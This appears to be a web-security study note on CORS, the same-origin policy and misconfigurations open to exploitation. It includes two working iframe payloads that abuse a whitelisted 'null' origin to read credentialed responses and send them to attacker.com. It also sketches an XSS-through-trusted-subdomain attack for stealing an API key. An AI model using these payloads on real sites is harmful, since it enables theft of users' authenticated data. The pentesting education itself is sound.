Cross-Origin Resource Sharing (CORS) standard **enables servers to define who can access their assets** and **which HTTP request methods are permitted** from external sources.

A **same-origin** policy mandates that a **server requesting** a resource and the server hosting the **resource** share the same protocol (e.g., `http://`), domain name (e.g., `internal-web.com`), and **port** (e.g., 80). Under this policy, only web pages from the same domain and port are allowed access to the resources.

The application of the same-origin policy in the context of `http://normal-website.com/example/example.html` is illustrated as follows:

| URL accessed                              | Access permitted?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Yes: Identical scheme, domain, and port |
| `http://normal-website.com/example2/`     | Yes: Identical scheme, domain, and port |
| `https://normal-website.com/example/`     | No: Different scheme and port           |
| `http://en.normal-website.com/example/`   | No: Different domain                    |
| `http://www.normal-website.com/example/`  | No: Different domain                    |
| `http://normal-website.com:8080/example/` | No: Different port                      |

# Exploitable Configurations

It has been observed that the setting of `Access-Control-Allow-Credentials` to **`true`** is a prerequisite for most **real attacks**. This setting permits the browser to send credentials and read the response, enhancing the attack’s effectiveness. Without this, the benefit of making a browser issue a request over doing it oneself diminishes, as leveraging a user’s cookies becomes unfeasible.

## Exploiting the `null` Origin

The `null` origin, specified for situations like redirects or local HTML files, holds a unique position. Some applications whitelist this origin to facilitate local development, inadvertently allowing any website to mimic a `null` origin through a sandboxed *iframe*, thus bypassing CORS restrictions.

Some applications might whitelist the `null` origin to support local development of the application. For example, suppose an application receives the following cross-origin request:
```
GET /sensitive-victim-data 
Host: vulnerable-website.com 
Origin: null
```
Response:
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null 
Access-Control-Allow-Credentials: true
```
In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access.

### Payloads

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```
OR
```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

## Exploiting XSS via CORS Trust
Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to [[XSS - Cross-Site Scripting]], then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

**Request**
```
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=..
```
**Response**
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: 
https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```
Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like: `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`



# References and more attacks
- [https://hacktricks.wiki/en/pentesting-web/cors-bypass.html](https://hacktricks.wiki/en/pentesting-web/cors-bypass.html)
- [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
- [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)